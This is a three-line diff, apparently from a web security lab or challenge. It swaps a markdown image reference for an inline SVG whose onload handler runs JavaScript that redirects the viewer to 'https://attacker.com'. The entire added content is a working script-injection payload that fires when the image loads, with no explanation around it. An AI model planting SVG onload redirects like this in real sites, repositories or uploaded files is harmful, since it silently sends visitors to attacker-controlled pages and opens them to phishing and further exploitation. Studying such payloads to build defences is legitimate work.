@@ -1,1 +1,3 @@
-![Redirect](https://botdevphone-jpg.github.io/web-client/ch62/redirect.svg)
+<svg xmlns="http://www.w3.org/2000/svg" onload="location.href='https://attacker.com'">
+  <rect width="100%" height="100%" fill="red"/>
+</svg>
